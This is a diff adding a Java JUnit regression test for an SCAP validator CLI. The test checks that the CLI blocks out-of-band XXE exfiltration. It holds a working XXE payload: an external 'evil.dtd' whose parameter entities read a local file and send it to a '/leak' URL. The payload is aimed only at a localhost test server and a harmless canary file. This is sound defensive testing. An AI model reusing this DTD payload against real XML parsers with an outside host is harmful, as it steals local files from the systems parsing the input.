@@ -48,6 +48,8 @@ import java.util.concurrent.atomic.AtomicInteger;
 import java.util.jar.JarFile;
 import java.util.zip.ZipFile;
 
+import javax.xml.parsers.DocumentBuilderFactory;
+
 import static org.junit.Assert.assertEquals;
 import static org.junit.Assert.assertFalse;
 import static org.junit.Assert.assertNotNull;
@@ -210,6 +212,81 @@ public class XXEDistributionIT {
       Result validResult = cli(Arrays.asList("-componentfile", valid.toString()));
       assertEquals(validResult.output, 0, validResult.exit);
       assertEquals(0, requests.get());
+    } finally {
+      server.stop(0);
+    }
+  }
+
+  /**
+   * Recreates the out-of-band exfiltration described in the 2026-10-20 external security report. A DOCTYPE on a
+   * real SCAP 1.2, 1.3 or 1.4 data stream points at an external DTD whose parameter entities would send the
+   * content of a local file to the attacker's web server. The reporter's original sample file was not provided,
+   * so the file is rebuilt from the report's description.
+   */
+  @Test
+  public void packagedCliRejectsOutOfBandExfiltrationFromExternalDtd() throws Exception {
+    String canary = "HARMLESS-OOB-" + UUID.randomUUID();
+    File local = write("oob-canary.txt", canary);
+    AtomicInteger requests = new AtomicInteger();
+    HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
+    String origin = "http://127.0.0.1:" + server.getAddress().getPort();
+    byte[] dtd = ("<!ENTITY % file SYSTEM '" + local.toURI() + "'>\n"
+        + "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM '" + origin + "/leak?d=%file;'>\">\n"
+        + "%eval;\n%exfil;\n").getBytes(StandardCharsets.UTF_8);
+    server.createContext("/", exchange -> {
+      requests.incrementAndGet();
+      if (exchange.getRequestURI().getPath().equals("/evil.dtd")) {
+        exchange.sendResponseHeaders(200, dtd.length);
+        try (java.io.OutputStream output = exchange.getResponseBody()) {
+          output.write(dtd);
+        }
+      } else {
+        exchange.sendResponseHeaders(200, -1);
+      }
+      exchange.close();
+    });
+    server.start();
+    try {
+      String[][] carriers = {
+          { "1.2", "src/test/resources/candidates/scap-12/scap_gov.nist_USGCB-Windows-XP-firewall.xml" },
+          { "1.3", "src/test/resources/candidates/scap-13/source_data_stream_collection_sample.xml" },
+          { "1.4", "src/test/resources/candidates/scap-14/source_data_stream_collection_sample.xml" } };
+      for (String[] carrier : carriers) {
+        String version = carrier[0];
+        String text = Files.readString(new File(carrier[1]).toPath());
+        assertTrue(text.startsWith("<?xml"));
+        int declarationEnd = text.indexOf("?>") + 2;
+        File input = write("oob-recreated-" + version + ".xml", text.substring(0, declarationEnd)
+            + "\n<!DOCTYPE data-stream-collection SYSTEM '" + origin + "/evil.dtd'>" + text.substring(declarationEnd));
+
+        // Control: a parser with default settings must reach the server, otherwise the checks below prove nothing.
+        requests.set(0);
+        try {
+          DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(input);
+        } catch (Exception e) {
+          // The parse outcome is irrelevant. Only the requests it makes are checked.
+        }
+        assertTrue("Control parser did not reach the test server for SCAP " + version, requests.get() > 0);
+        requests.set(0);
+
+        File resultFile = new File(temporary.getRoot(), "vr-" + version + ".xml");
+        File reportFile = new File(temporary.getRoot(), "vr-" + version + ".html");
+        for (List<String> options : Arrays.asList(
+            Arrays.asList("-file", input.toString(), "-scapversion", version, "-usecase", "CONFIGURATION",
+                "-valresultfile", resultFile.toString(), "-valreportfile", reportFile.toString()),
+            Arrays.asList("-auto", input.toString()))) {
+          Result result = cli(options);
+          assertTrue("SCAP " + version + ": " + result.output, result.exit != 0);
+          assertTrue("SCAP " + version + ": " + result.output, result.output.contains("DOCTYPE"));
+          assertFalse(result.output.contains(canary));
+          assertEquals("SCAP " + version, 0, requests.get());
+        }
+        for (File produced : new File[] { resultFile, reportFile }) {
+          if (produced.exists()) {
+            assertFalse(Files.readString(produced.toPath()).contains(canary));
+          }
+        }
+      }
     } finally {
       server.stop(0);
     }
